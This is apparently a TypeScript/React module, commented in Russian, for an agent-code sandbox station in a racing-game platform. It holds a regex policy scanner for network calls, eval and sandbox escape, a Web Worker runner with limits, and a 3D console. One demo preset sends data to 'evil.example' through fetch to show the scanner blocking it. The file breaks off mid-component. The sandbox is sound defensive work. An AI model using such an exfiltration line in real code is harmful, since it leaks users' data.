/**
 * ЗАДАЧА 6.5 — SANDBOX ДЛЯ АГЕНТОВ  (FORMULA I1 · Platform)
 * ============================================================================
 * Платформа. Физическая «СТАНЦИЯ ПЕСОЧНИЦЫ» (SANDBOX LAB) в паддоке:
 * агентский код сначала прогоняется в изоляции, и только прошедший проверку
 * агент допускается до заезда.
 *
 * Что реализовано:
 *   • доменная модель запуска — `SandboxVerdict` (pass/fail/timeout/violation),
 *     `SandboxLimits` (timeoutMs / maxOps / seed), `SandboxRun` (полный лог
 *     прогона со stdout, ops, durationMs, violations, engine);
 *   • СТАТИЧЕСКИЙ ПОЛИТИК-СКАН `scanAgentCode()` — 12 правил на утечку данных
 *     и побег из песочницы (fetch/XHR/WebSocket/importScripts/eval/require/
 *     process/document/globalThis/postMessage/вложенный Worker/вечный цикл);
 *     критичное нарушение => код НЕ исполняется (verdict 'violation');
 *   • РЕАЛЬНАЯ ИЗОЛЯЦИЯ через Web Worker, собранный из Blob-URL:
 *       - воркер запускается без DOM и без доступа к состоянию страницы;
 *       - в инжектируемую функцию тенями подменены fetch/XHR/WebSocket/
 *         importScripts/postMessage/process/require/document/window/localStorage;
 *       - кооперативный счётчик операций `sandbox.ops()` + внутренний дедлайн;
 *       - жёсткий внешний дедлайн: при превышении воркер `terminate()`-ится;
 *       - после прогона Blob-URL отзывается (нет утечки ресурсов);
 *     при отсутствии Worker API — синхронный fallback-раннер (движок 'fallback');
 *   • REST-клиент с JWT из общего хранилища AuthGate (ключ `formula_i1.jwt`):
 *       POST /api/sandbox/run → телеметрия прогона (контракт; при офлайне
 *         dev-режим просто помечает запись `synced:false`, песочница работает);
 *   • zustand-стор `useAgentSandbox` (agent/code/limits/runs/running + run()/presets);
 *   • 3D-станция: подиум-платформа, стеклянная камера, световой сканер-луч,
 *     ярма ядра-агента, LED-полоса и интерактивная консоль (drei <Html transform>):
 *     редактор кода, пресеты «успех / лимит / запрет сети», слайдеры лимитов,
 *     кнопка RUN, вердикт-бейдж, живой stdout и история прогонов.
 *
 * Приёмы взяты из research/racing-game (MIT):
 *   - src/store.ts      — zustand-стор как единственный источник UI-состояния;
 *   - src/ui/Intro.tsx  — онбординг «Click to start» перед допуском к заезду;
 *   - src/models/vehicle — покадровая анимация через мутацию ref'ов (без ререндеров);
 *   - src/effects/Dust.tsx — дешёвый эмиттер-«искры» повышенной активности.
 * Код собственный, в терминах проекта AI-1. Лицензия референса — MIT.
 * ============================================================================
 */

import { useCallback, useMemo, useRef, useState } from 'react';
import type { CSSProperties } from 'react';
import { useFrame } from '@react-three/fiber';
import { Html, Text } from '@react-three/drei';
import * as THREE from 'three';
import { create } from 'zustand';
import { readStoredToken } from './AuthGate';

/* -------------------------------------------------------------------------- */
/*  Домен песочницы                                                           */
/* -------------------------------------------------------------------------- */

/** Итог прогона агента в песочнице. */
export type SandboxVerdict = 'pass' | 'fail' | 'timeout' | 'violation' | 'pending';

/** Квоты запуска. Всё, что не влезло, — нарушение, а не «подвисание» арены. */
export interface SandboxLimits {
  /** Жёсткий дедлайн исполнения, мс. */
  timeoutMs: number;
  /** Максимум «операций», которые агент успел учесть через sandbox.ops(). */
  maxOps: number;
  /** Сид детерминированного ГПСЧ внутри песочницы. */
  seed: number;
}

/** Уровень опасности правила политки-скана. */
export type SandboxSeverity = 'critical' | 'high';

/** Правило статического скана кода агента. */
export interface SandboxRule {
  id: string;
  label: string;
  hint: string;
  severity: SandboxSeverity;
  re: RegExp;
}

/** Найдённое нарушение политики. */
export interface SandboxViolation {
  rule: string;
  label: string;
  hint: string;
  severity: SandboxSeverity;
  /** Номер строки (1-based) в исходнике агента. */
  line: number;
  /** Дословный фрагмент, который сработал. */
  evidence: string;
}

/** Движок, которым выполнен прогон. */
export type SandboxEngine = 'worker' | 'fallback' | 'blocked';

/** Результат одного низкоуровневого прогона. */
export interface SandboxExecResult {
  verdict: SandboxVerdict;
  stdout: string[];
  ops: number;
  durationMs: number;
  error?: string;
  result?: unknown;
  violations: SandboxViolation[];
  engine: SandboxEngine;
}

/** Запись прогона в истории песочницы. */
export interface SandboxRun {
  id: string;
  agent: string;
  code: string;
  limits: SandboxLimits;
  verdict: SandboxVerdict;
  stdout: string[];
  ops: number;
  durationMs: number;
  error?: string;
  result?: unknown;
  violations: SandboxViolation[];
  engine: SandboxEngine;
  createdAt: number;
  /** Удалось ли отправить телеметрию на бэкенд. */
  synced: boolean;
}

/** Версия модуля «Песочница агентов» (задача 6.5). */
export const AGENT_SANDBOX_VERSION = '1.0.0';

/** Пресет запуска в песочнице. */
export interface SandboxPreset {
  id: string;
  label: string;
  hint: string;
  code: string;
}

export const SANDBOX_DEFAULT_LIMITS: SandboxLimits = {
  timeoutMs: 1500,
  maxOps: 500_000,
  seed: 20240613,
};

/** Абсолютные рамки квот (защита самого UI от абсурдных значений). */
export const SANDBOX_LIMIT_BOUNDS = {
  timeoutMs: { min: 250, max: 8000 },
  maxOps: { min: 1_000, max: 5_000_000 },
} as const;

/* -------------------------------------------------------------------------- */
/*  Политика: статический скан кода                                           */
/* -------------------------------------------------------------------------- */

/**
 * Правила скана. Регэкспы БЕЗ флага `g` — `RegExp.exec` не мутирует состояние
 * между запусками сканера. Скан идёт по исходнику целиком (включая комментарии).
 */
export const SANDBOX_RULES: SandboxRule[] = [
  {
    id: 'net-fetch',
    label: 'Сетевой доступ: fetch()',
    hint: 'Из песочницы запрещено ходить в сеть — только чистые вычисления.',
    severity: 'critical',
    re: /\bfetch\s*\(/,
  },
  {
    id: 'net-xhr',
    label: 'Сетевой доступ: XMLHttpRequest',
    hint: 'XHR не предоставляется агенту.',
    severity: 'critical',
    re: /\bXMLHttpRequest\b/,
  },
  {
    id: 'net-stream',
    label: 'Сетевой доступ: WebSocket/EventSource',
    hint: 'Постоянные каналы связи закрыты.',
    severity: 'critical',
    re: /\bWebSocket\b|\bEventSource\b/,
  },
  {
    id: 'loader-importScripts',
    label: 'Загрузка внешнего кода: importScripts()',
    hint: 'Подгрузка скриптов в песочницу запрещена.',
    severity: 'critical',
    re: /\bimportScripts\s*\(/,
  },
  {
    id: 'dyn-import',
    label: 'Динамический import()',
    hint: 'Динамические модули не разрешены — только код, поданный на вход.',
    severity: 'critical',
    re: /\bimport\s*\(/,
  },
  {
    id: 'dyn-code',
    label: 'Генерация кода: eval()/new Function()',
    hint: 'Динамическое исполнение кода ломает границу изоляции.',
    severity: 'critical',
    re: /\beval\s*\(|\bnew\s+Function\s*\(/,
  },
  {
    id: 'node-require',
    label: 'Node API: require()',
    hint: 'Модули Node недоступны агенту.',
    severity: 'critical',
    re: /\brequire\s*\(/,
  },
  {
    id: 'node-process',
    label: 'Node API: process.*',
    hint: 'Доступ к окружению процесса запрещён.',
    severity: 'critical',
    re: /\bprocess\s*\./,
  },
  {
    id: 'dom-access',
    label: 'Доступ к DOM/хранилищу',
    hint: 'document/window/localStorage/indexedDB в песочнице отсутствуют.',
    severity: 'high',
    re: /\bdocument\s*\.|\bwindow\s*\.|\blocalStorage\b|\bindexedDB\b/,
  },
  {
    id: 'escape-scope',
    label: 'Побег из песочницы',
    hint: 'globalThis/self/postMessage могут вывести данные за границу изоляции.',
    severity: 'high',
    re: /\bglobalThis\b|\bself\s*\.|\bpostMessage\s*\(/,
  },
  {
    id: 'nested-worker',
    label: 'Вложенный воркер',
    hint: 'new Worker() порождает неуправляемые потоки.',
    severity: 'high',
    re: /\bnew\s+Worker\b/,
  },
  {
    id: 'hang-loop',
    label: 'Гарантированное зацикливание',
    hint: 'while(true)/for(;;) повесит поток до жёсткого terminate.',
    severity: 'critical',
    re: /while\s*\(\s*(true|1)\s*\)|for\s*\(\s*;\s*;\s*\)/,
  },
];

/** Просканировать код агента на нарушения политики песочницы. */
export function scanAgentCode(code: string): SandboxViolation[] {
  const found: SandboxViolation[] = [];
  for (const rule of SANDBOX_RULES) {
    const m = rule.re.exec(code);
    if (!m) continue;
    const idx = typeof m.index === 'number' ? m.index : 0;
    found.push({
      rule: rule.id,
      label: rule.label,
      hint: rule.hint,
      severity: rule.severity,
      line: code.slice(0, idx).split('\n').length,
      evidence: m[0],
    });
  }
  return found;
}

/** Есть ли среди нарушений критичное (блокирует исполнение). */
export function hasCriticalViolation(violations: SandboxViolation[]): boolean {
  return violations.some((v) => v.severity === 'critical');
}

/* -------------------------------------------------------------------------- */
/*  Изоляция: Web Worker из Blob + синхронный fallback                        */
/* -------------------------------------------------------------------------- */

/**
 * Исходник воркера-песочницы. `String.raw` сохраняет `\n` буквально — они
 * доедут до инжектируемой функции как реальные переводы строк.
 */
export const SANDBOX_WORKER_SRC = String.raw`
'use strict';
var OUT = [];
var OPS = 0;
var T0 = 0;
var LIMIT_MS = 1500;
var MAX_OPS = 500000;

function push(level, args) {
  var parts = [];
  for (var i = 0; i < args.length; i++) {
    var a = args[i];
    try {
      if (typeof a === 'string') parts.push(a);
      else parts.push(JSON.stringify(a));
    } catch (e) {
      parts.push(String(a));
    }
  }
  OUT.push('[' + level + '] ' + parts.join(' '));
  if (OUT.length > 400) OUT.shift();
}

function tick(n) {
  OPS += (typeof n === 'number' && n > 0) ? n : 1;
  if (OPS > MAX_OPS) throw new Error('SANDBOX_OPS_EXCEEDED');
  if (LIMIT_MS > 0 && (Date.now() - T0) > LIMIT_MS) throw new Error('SANDBOX_TIMEOUT');
  return OPS;
}

function makeRandom(seed) {
  var s = (seed >>> 0) || 0x9e3779b9;
  return function random() {
    s = (s * 1664525 + 1013904223) >>> 0;
    return s / 4294967296;
  };
}

function safe(value) {
  try {
    JSON.stringify(value);
    return value;
  } catch (e) {
    return '[unserializable]';
  }
}

self.onmessage = function (ev) {
  var data = (ev && ev.data) || {};
  var code = String(data.code || '');
  LIMIT_MS = Number(data.timeoutMs) || 1500;
  MAX_OPS = Number(data.maxOps) || 500000;
  var seed = Number(data.seed) || 20240613;
  OUT = [];
  OPS = 0;
  T0 = Date.now();

  var sandbox = {
    log: function () { push('log', arguments); },
    console: {
      log: function () { push('log', arguments); },
      info: function () { push('info', arguments); },
      warn: function () { push('warn', arguments); },
      error: function () { push('error', arguments); },
      debug: function () { push('debug', arguments); }
    },
    ops: tick,
    now: function () { return Date.now() - T0; },
    random: makeRandom(seed),
    limits: { timeoutMs: LIMIT_MS, maxOps: MAX_OPS, network: false, storage: false, dom: false },
    result: function (v) { return safe(v); }
  };

  try {
    var fn = new Function(
      'sandbox','self','globalThis','fetch','XMLHttpRequest','WebSocket','EventSource',
      'importScripts','postMessage','process','require','module','exports','document','window','localStorage',
      '"use strict";\nvar console = sandbox.console;\nvar print = sandbox.log;\n' +
        code +
        '\nif (typeof agent === "function") { return agent(sandbox); }\nreturn undefined;'
    );
    var res = fn(sandbox);
    self.postMessage({ ok: true, verdict: 'pass', stdout: OUT, ops: OPS, durationMs: Date.now() - T0, result: safe(res) });
  } catch (err) {
    var msg = String((err && err.message) || err);
    var verdict = 'fail';
    if (msg.indexOf('SANDBOX_TIMEOUT') >= 0) verdict = 'timeout';
    else if (msg.indexOf('SANDBOX_OPS_EXCEEDED') >= 0) verdict = 'violation';
    self.postMessage({ ok: false, verdict: verdict, stdout: OUT, ops: OPS, durationMs: Date.now() - T0, error: msg });
  }
};
`;

/** Синхронный fallback-раннер (когда Worker API недоступен: SSR/jsdom). */
function execInFallback(code: string, limits: SandboxLimits): SandboxExecResult {
  const startedAt = Date.now();
  const stdout: string[] = [];
  let ops = 0;

  const push = (level: string, args: IArguments | unknown[]) => {
    const parts: string[] = [];
    for (let i = 0; i < args.length; i++) {
      const a = (args as ArrayLike<unknown>)[i];
      try {
        parts.push(typeof a === 'string' ? a : JSON.stringify(a));
      } catch {
        parts.push(String(a));
      }
    }
    stdout.push('[' + level + '] ' + parts.join(' '));
    if (stdout.length > 400) stdout.shift();
  };

  const tick = (n?: number) => {
    ops += typeof n === 'number' && n > 0 ? n : 1;
    if (ops > limits.maxOps) throw new Error('SANDBOX_OPS_EXCEEDED');
    if (Date.now() - startedAt > limits.timeoutMs) throw new Error('SANDBOX_TIMEOUT');
    return ops;
  };

  let randState = (limits.seed >>> 0) || 0x9e3779b9;
  const sandbox = {
    log: (...args: unknown[]) => push('log', args),
    console: {
      log: (...a: unknown[]) => push('log', a),
      info: (...a: unknown[]) => push('info', a),
      warn: (...a: unknown[]) => push('warn', a),
      error: (...a: unknown[]) => push('error', a),
      debug: (...a: unknown[]) => push('debug', a),
    },
    ops: tick,
    now: () => Date.now() - startedAt,
    random: () => {
      randState = (randState * 1664525 + 1013904223) >>> 0;
      return randState / 4294967296;
    },
    limits: { timeoutMs: limits.timeoutMs, maxOps: limits.maxOps, network: false, storage: false, dom: false },
    result: (v: unknown) => v,
  };

  try {
    const fn = new Function(
      'sandbox', 'self', 'globalThis', 'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource',
      'importScripts', 'postMessage', 'process', 'require', 'module', 'exports', 'document', 'window', 'localStorage',
      '"use strict";\nvar console = sandbox.console;\nvar print = sandbox.log;\n' +
        code +
        '\nif (typeof agent === "function") { return agent(sandbox); }\nreturn undefined;',
    );
    const res = fn(sandbox);
    return {
      verdict: 'pass',
      stdout,
      ops,
      durationMs: Date.now() - startedAt,
      result: res,
      violations: [],
      engine: 'fallback',
    };
  } catch (err) {
    const msg = String((err && (err as Error).message) || err);
    return {
      verdict: msg.indexOf('SANDBOX_OPS_EXCEEDED') >= 0 ? 'violation' : 'fail',
      stdout,
      ops,
      durationMs: Date.now() - startedAt,
      error: msg,
      violations: [],
      engine: 'fallback',
    };
  }
}

/** Запустить код агента в изолированном Web Worker с жёстким дедлайном. */
async function execInWorker(code: string, limits: SandboxLimits): Promise<SandboxExecResult> {
  const workerApiOk =
    typeof Worker !== 'undefined' &&
    typeof Blob !== 'undefined' &&
    typeof URL !== 'undefined' &&
    typeof URL.createObjectURL === 'function';
  if (!workerApiOk) return execInFallback(code, limits);

  let blobUrl = '';
  let worker: Worker;
  try {
    const blob = new Blob([SANDBOX_WORKER_SRC], { type: 'application/javascript' });
    blobUrl = URL.createObjectURL(blob);
    worker = new Worker(blobUrl);
  } catch {
    return execInFallback(code, limits);
  }

  return new Promise<SandboxExecResult>((resolve) => {
    const startedAt = Date.now();
    let settled = false;

    const cleanup = () => {
      try {
        worker.terminate();
      } catch {
        /* noop */
      }
      try {
        URL.revokeObjectURL(blobUrl);
      } catch {
        /* noop */
      }
    };

    // Внешний дедлайн: внутренний кооперативный + запас на доставку сообщения.
    const timer = setTimeout(
      () => {
        if (settled) return;
        settled = true;
        cleanup();
        resolve({
          verdict: 'timeout',
          stdout: [],
          ops: 0,
          durationMs: Date.now() - startedAt,
          error: 'Превышен лимит ' + limits.timeoutMs + ' мс — воркер уничтожен',
          violations: [],
          engine: 'worker',
        });
      },
      Math.max(SANDBOX_LIMIT_BOUNDS.timeoutMs.min, limits.timeoutMs + 300),
    );

    worker.onmessage = (ev: MessageEvent) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      cleanup();
      const d = (ev.data || {}) as {
        verdict?: SandboxVerdict;
        stdout?: string[];
        ops?: number;
        durationMs?: number;
        error?: string;
        result?: unknown;
      };
      resolve({
        verdict: d.verdict || 'fail',
        stdout: Array.isArray(d.stdout) ? d.stdout : [],
        ops: typeof d.ops === 'number' ? d.ops : 0,
        durationMs: typeof d.durationMs === 'number' ? d.durationMs : Date.now() - startedAt,
        error: d.error,
        result: d.result,
        violations: [],
        engine: 'worker',
      });
    };

    worker.onerror = (ev: ErrorEvent) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      cleanup();
      resolve({
        verdict: 'fail',
        stdout: [],
        ops: 0,
        durationMs: Date.now() - startedAt,
        error: ev && ev.message ? ev.message : 'Ошибка worker-потока',
        violations: [],
        engine: 'worker',
      });
    };

    worker.postMessage({
      code,
      timeoutMs: limits.timeoutMs,
      maxOps: limits.maxOps,
      seed: limits.seed,
    });
  });
}

/**
 * Публичная точка входа: скан политики → (при чистом коде) изолированный прогон.
 * Любое нарушение блокирует исполнение: сначала безопасность, потом результат.
 */
export async function runInSandbox(
  code: string,
  limits: SandboxLimits = SANDBOX_DEFAULT_LIMITS,
): Promise<SandboxExecResult> {
  const violations = scanAgentCode(code);
  if (violations.length > 0) {
    return {
      verdict: 'violation',
      stdout: [],
      ops: 0,
      durationMs: 0,
      error: 'Исполнение заблокировано политикой песочницы (' + violations.length + ')',
      violations,
      engine: 'blocked',
    };
  }
  const exec = await execInWorker(code, limits);
  return { ...exec, violations: [] };
}

/* -------------------------------------------------------------------------- */
/*  REST: телеметрия прогонов                                                 */
/* -------------------------------------------------------------------------- */

const env = import.meta.env as Record<string, string | boolean | undefined>;

/** Базовый URL arena-API (переопределяется через VITE_API_BASE). */
export const SANDBOX_API_BASE =
  typeof env.VITE_API_BASE === 'string' && env.VITE_API_BASE ? env.VITE_API_BASE : '/api';

/** Авторизационные заголовки из общего JWT-хранилища (см. AuthGate). */
export function sandboxAuthHeaders(): Record<string, string> {
  try {
    const token = readStoredToken();
    return token ? { Authorization: 'Bearer ' + token } : {};
  } catch {
    return {};
  }
}

/** Best-effort отправка телеметрии прогона; офлайн — просто `false`. */
export async function postSandboxRun(run: SandboxRun): Promise<boolean> {
  try {
    const res = await fetch(SANDBOX_API_BASE + '/sandbox/run', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...sandboxAuthHeaders() },
      body: JSON.stringify({
        agent: run.agent,
        code: run.code,
        limits: run.limits,
        verdict: run.verdict,
        ops: run.ops,
        duration_ms: run.durationMs,
        violations: run.violations.map((v) => v.rule),
      }),
    });
    return res.ok;
  } catch {
    return false;
  }
}

/* -------------------------------------------------------------------------- */
/*  Пресеты кода агента                                                       */
/* -------------------------------------------------------------------------- */

/** Успешный агент: линейный расчёт, батч-учёт операций, чистый PASS. */
export const SANDBOX_CODE_SAMPLE = [
  '// Агент-сумматор: считает 1..N и возвращает результат в песочницу.',
  'function agent(sandbox) {',
  '  let sum = 0;',
  '  const N = 10000;',
  '  for (let i = 1; i <= N; i++) {',
  '    sum += i;',
  '    if (i % 2000 === 0) sandbox.ops(200); // батч-учёт операций',
  '  }',
  "  sandbox.log('сумма 1..' + N + ' =', sum);",
  "  return { sum: sum, ok: true };",
  '}',
].join('\n');

/** Тяжёлый агент: кооперативный лимит операций обязан его остановить. */
export const SANDBOX_CODE_HEAVY = [
  '// Тяжёлый агент: песочница обязана прервать цикл по лимиту операций.',
  'function agent(sandbox) {',
  '  let x = 0;',
  '  while (x < 1e12) {',
  '    x += 1;',
  '    sandbox.ops(1);',
  '  }',
  '  return x;',
  '}',
].join('\n');

/** Опасный агент: попытка выгрузить данные наружу — блокируется статикой. */
export const SANDBOX_CODE_EXFIL = [
  '// Опасный агент: пытается выгрузить данные за пределы песочницы.',
  'function agent(sandbox) {',
  "  sandbox.log('пробую выгрузить данные наружу...');",
  "  return fetch('https://evil.example/collect');",
  '}',
].join('\n');

export const SANDBOX_PRESETS: SandboxPreset[] = [
  { id: 'sample', label: '✅ Успешный прогон', hint: 'линейный расчёт, PASS', code: SANDBOX_CODE_SAMPLE },
  { id: 'heavy', label: '⏱ Лимит операций', hint: 'тяжёлый цикл, прерывание', code: SANDBOX_CODE_HEAVY },
  { id: 'exfil', label: '🛡 Запрет сети', hint: 'fetch() — блок до запуска', code: SANDBOX_CODE_EXFIL },
];

/** Цвет и подпись вердикта. */
export const SANDBOX_VERDICT_META: Record<SandboxVerdict, { label: string; color: string; glyph: string }> = {
  pass: { label: 'PASS', color: '#6eff8b', glyph: '✅' },
  fail: { label: 'FAIL', color: '#ff5c5c', glyph: '❌' },
  timeout: { label: 'TIMEOUT', color: '#ffd700', glyph: '⏱' },
  violation: { label: 'BLOCKED', color: '#a855f7', glyph: '🛡' },
  pending: { label: 'RUNNING', color: '#4dd0ff', glyph: '▶' },
};

function clamp(v: number, lo: number, hi: number): number {
  return Math.min(hi, Math.max(lo, v));
}

function makeRunId(): string {
  return 'sbx_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7);
}

/* -------------------------------------------------------------------------- */
/*  Стор песочницы                                                            */
/* -------------------------------------------------------------------------- */

export interface AgentSandboxState {
  agent: string;
  code: string;
  limits: SandboxLimits;
  runs: SandboxRun[];
  running: boolean;
  selectedRunId: string | null;
  setAgent: (v: string) => void;
  setCode: (v: string) => void;
  setLimits: (patch: Partial<SandboxLimits>) => void;
  loadPreset: (id: string) => void;
  run: () => Promise<SandboxRun>;
  selectRun: (id: string | null) => void;
  clearRuns: () => void;
}

export const useAgentSandbox = create<AgentSandboxState>((set, get) => ({
  agent: 'agent_sandbox',
  code: SANDBOX_CODE_SAMPLE,
  limits: { ...SANDBOX_DEFAULT_LIMITS },
  runs: [],
  running: false,
  selectedRunId: null,

  setAgent: (v) => set({ agent: v }),
  setCode: (v) => set({ code: v }),
  setLimits: (patch) =>
    set((s) => {
      const next: SandboxLimits = {
        timeoutMs:
          typeof patch.timeoutMs === 'number'
            ? clamp(Math.round(patch.timeoutMs), SANDBOX_LIMIT_BOUNDS.timeoutMs.min, SANDBOX_LIMIT_BOUNDS.timeoutMs.max)
            : s.limits.timeoutMs,
        maxOps:
          typeof patch.maxOps === 'number'
            ? clamp(Math.round(patch.maxOps), SANDBOX_LIMIT_BOUNDS.maxOps.min, SANDBOX_LIMIT_BOUNDS.maxOps.max)
            : s.limits.maxOps,
        seed: typeof patch.seed === 'number' ? patch.seed | 0 : s.limits.seed,
      };
      return { limits: next };
    }),

  loadPreset: (id) => {
    const preset = SANDBOX_PRESETS.find((p) => p.id === id);
    if (preset) set({ code: preset.code });
  },

  run: async () => {
    const { agent, code, limits } = get();
    set({ running: true });

    const exec = await runInSandbox(code, { ...limits });
    const record: SandboxRun = {
      id: makeRunId(),
      agent,
      code,
      limits: { ...limits },
      verdict: exec.verdict,
      stdout: exec.stdout,
      ops: exec.ops,
      durationMs: exec.durationMs,
      error: exec.error,
      result: exec.result,
      violations: exec.violations,
      engine: exec.engine,
      createdAt: Date.now(),
      synced: false,
    };

    set((s) => ({
      runs: [record, ...s.runs].slice(0, 24),
      running: false,
      selectedRunId: record.id,
    }));

    const synced = await postSandboxRun(record);
    if (synced) {
      set((s) => ({ runs: s.runs.map((r) => (r.id === record.id ? { ...r, synced: true } : r)) }));
    }
    return record;
  },

  selectRun: (id) => set({ selectedRunId: id }),
  clearRuns: () => set({ runs: [], selectedRunId: null }),
}));

/* -------------------------------------------------------------------------- */
/*  DOM-консоль песочницы (drei <Html transform>)                             */
/* -------------------------------------------------------------------------- */

const panelStyle: CSSProperties = {
  width: 560,
  fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
  color: '#dfe8ff',
  background: 'rgba(9, 13, 24, 0.94)',
  border: '1px solid rgba(125, 211, 252, 0.35)',
  borderRadius: 12,
  boxShadow: '0 20px 60px rgba(0,0,0,0.6), inset 0 0 40px rgba(77,208,255,0.08)',
  padding: 12,
  userSelect: 'none',
};

const rowStyle: CSSProperties = { display: 'flex', gap: 8, alignItems: 'center', marginBottom: 8 };
const labelStyle: CSSProperties = { fontSize: 10, letterSpacing: 1, color: '#7a8baa', textTransform: 'uppercase' };
const inputStyle: CSSProperties = {
  flex: 1,
  background: '#05070d',
  color: '#e8f0ff',
  border: '1px solid #23304d',
  borderRadius: 6,
  padding: '6px 8px',
  fontSize: 12,
  outline: 'none',
};
const btnStyle: CSSProperties = {
  background: '#122139',
  color: '#8fdcff',
  border: '1px solid #2b4a75',
  borderRadius: 6,
  padding: '5px 9px',
  fontSize: 11,
  cursor: 'pointer',
};
const codeStyle: CSSProperties = {
  width: '100%',
  height: 148,
  boxSizing: 'border-box',
  resize: 'none',
  background: '#05070d',
  color: '#b8ffd0',
  border: '1px solid #23304d',
  borderRadius: 8,
  padding: 8,
  fontSize: 11,
  lineHeight: 1.45,
  outline: 'none',
};
const logStyle: CSSProperties = {
  maxHeight: 118,
  overflow: 'auto',
  background: '#05070d',
  border: '1px solid #1b2740',
  borderRadius: 8,
  padding: 8,
  fontSize: 10.5,
  lineHeight: 1.5,
  whiteSpace: 'pre-wrap',
};

export interface SandboxConsoleProps {
  /** Колбэк после завершения прогона (например, чтобы отправить агента в заезд). */
  onResult?: (run: SandboxRun) => void;
}

/** Интерактивная DOM-консоль станции песочницы. */
export function SandboxConsole({ onResult }: SandboxConsoleProps) {
  const agent = useAgentSandbox((s) => s.agent);
  const code = useAgentSandbox((s) => s.code);
  const limits = useAgentSandbox((s) => s.limits);
  const runs = useAgentSandbox((s) => s.runs);
  const running = useAgentSandbox((s) => s.running);
  const selectedRunId = useAgentSandbox((s) => s.selectedRunId);
  const setAgent = useAgentSandbox((s) => s.setAgent);
  const setCode = useAgentSandbox((s) => s.setCode);
  const setLimits = useAgentSandbox((s) => s.setLimits);
  const loadPreset = useAgentSandbox((s) => s.loadPreset);
  const run = useAgentSandbox((s) => s.run);
  const selectRun = useAgentSandbox((s) => s.selectRun);
  const clearRuns = useAgentSandbox((s) => s.clearRuns);

  const [showHistory, setShowHistory] = useState(false);

  const selected = useMemo(
    () => runs.find((r) => r.id === selectedRunId) || null,
    [runs, selectedRunId],
  );

  const verdict: SandboxVerdict = selected ? selected.verdict : 'pending';
  const meta = SANDBOX_VERDICT_META[verdict];

  const handleRun = useCallback(() => {
    void run().then((r) => {
      if (onResult) onResult(r);
    });
  }, [run, onResult]);

  return (
    <div
      style={panelStyle}
      onPointerDown={(e) => e.stopPropagation()}
      onWheel={(e) => e.stopPropagation()}
    >
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
        <div>
          <div style={{ fontSize: 13, fontWeight: 800, letterSpacing: 2, color: '#8fdcff' }}>
            🧪 SANDBOX LAB
          </div>
          <div style={{ fontSize: 9.5, color: '#6b7ea0', letterSpacing: 1 }}>
            ИЗОЛЯЦИЯ · v{AGENT_SANDBOX_VERSION} · web-worker
          </div>
        </div>
        <div
          style={{
            padding: '4px 10px',
            borderRadius: 999,
            fontSize: 11,
            fontWeight: 800,
            letterSpacing: 1,
            color: meta.color,
            border: '1px solid ' + meta.color + '66',
            background: meta.color + '14',
          }}
        >
          {running ? '▶ RUNNING' : meta.glyph + ' ' + meta.label}
        </div>
      </div>

      <div style={rowStyle}>
        <span style={labelStyle}>agent</span>
        <input
          style={inputStyle}
          value={agent}
          onChange={(e) => setAgent(e.target.value)}
          spellCheck={false}
        />
      </div>

      <textarea
        style={codeStyle}
        value={code}
        onChange={(e) => setCode(e.target.value)}
        spellCheck={false}
        onPointerDown={(e) => e.stopPropagation()}
      />

      <div style={{ ...rowStyle, marginTop: 8, flexWrap: 'wrap' }}>
        {SANDBOX_PRESETS.map((p) => (
          <button
            key={p.id}
            style={btnStyle}
            title={p.hint}
            onClick={() => loadPreset(p.id)}
            onPointerDown={(e) => e.stopPropagation()}
          >
            {p.label}
          </button>
        ))}
        <span style={{ flex: 1 }} />
        <button
          style={{ ...btnStyle, color: '#9fe8ff' }}
          onClick={() => setShowHistory((v) => !v)}
          onPointerDown={(e) => e.stopPropagation()}
        >
          🗂 {runs.length}
        </button>
      </div>

      <div style={{ display: 'flex', gap: 12, marginBottom: 8 }}>
        <label style={{ flex: 1, fontSize: 10, color: '#7a8baa' }}>
          <span style={labelStyle}>timeout · {limits.timeoutMs} мс</span>
          <input
            type="range"
            min={SANDBOX_LIMIT_BOUNDS.timeoutMs.min}
            max={SANDBOX_LIMIT_BOUNDS.timeoutMs.max}
            step={50}
            value={limits.timeoutMs}
            onChange={(e) => setLimits({ timeoutMs: Number(e.target.value) })}
            style={{ width: '100%' }}
          />
        </label>
        <label style={{ flex: 1, fontSize: 10, color: '#7a8baa' }}>
          <span style={labelStyle}>maxOps · {limits.maxOps.toLocaleString('ru-RU')}</span>
          <input
            type="range"
            min={SANDBOX_LIMIT_BOUNDS.maxOps.min}
            max={SANDBOX_LIMIT_BOUNDS.maxOps.max}
            step={1000}
            value={limits.maxOps}
            onChange={(e) => setLimits({ maxOps: Number(e.target.value) })}
            style={{ width: '100%' }}
          />
        </label>
      </div>

      <div style={rowStyle}>
        <button
          style={{
            ...btnStyle,
            flex: 1,
            background: running ? '#1a2338' : 'linear-gradient(90deg,#0e5f8a,#6d28d9)',
            color: running ? '#5b6b88' : '#ffffff',
            fontSize: 12,
            fontWeight: 800,
            letterSpacing: 1,
            padding: '8px 10px',
            cursor: running ? 'default' : 'pointer',
          }}
          disabled={running}
          onClick={handleRun}
          onPointerDown={(e) => e.stopPropagation()}
        >
          {running ? '⏳ ИСПОЛНЯЮ В ИЗОЛЯЦИИ…' : '🚀 RUN IN SANDBOX'}
        </button>
      </div>

      <div style={logStyle}>
        {selected ? (
          <>
            <div style={{ color: meta.color }}>
              {meta.glyph} {meta.label} · engine={selected.engine} · {selected.durationMs} мс · ops=
              {selected.ops.toLocaleString('ru-RU')} · {selected.synced ? 'synced' : 'offline'}
            </div>
            {selected.error && <div style={{ color: '#ff9d9d' }}>! {selected.error}</div>}
            {selected.violations.map((v) => (
              <div key={v.rule} style={{ color: '#d8a6ff' }}>
                🛡 {v.label} (строка {v.line}) «{v.evidence}» — {v.hint}
              </div>
            ))}
            {selected.stdout.length === 0 && selected.violations.length === 0 && (
              <div style={{ color: '#4a5570' }}>stdout пуст</div>
            )}
            {selected.stdout.map((l, i) => (
              <div key={i} style={{ color: '#9fe8b8' }}>
                {l}
              </div>
            ))}
          </>
        ) : (
          <div style={{ color: '#4a5570' }}>
            Нажми RUN — агент будет прогнан в изолированном воркере. Нарушение политики блокирует
            запуск.
          </div>
        )}
      </div>

      {showHistory && (
        <div style={{ marginTop: 8, maxHeight: 96, overflow: 'auto' }}>
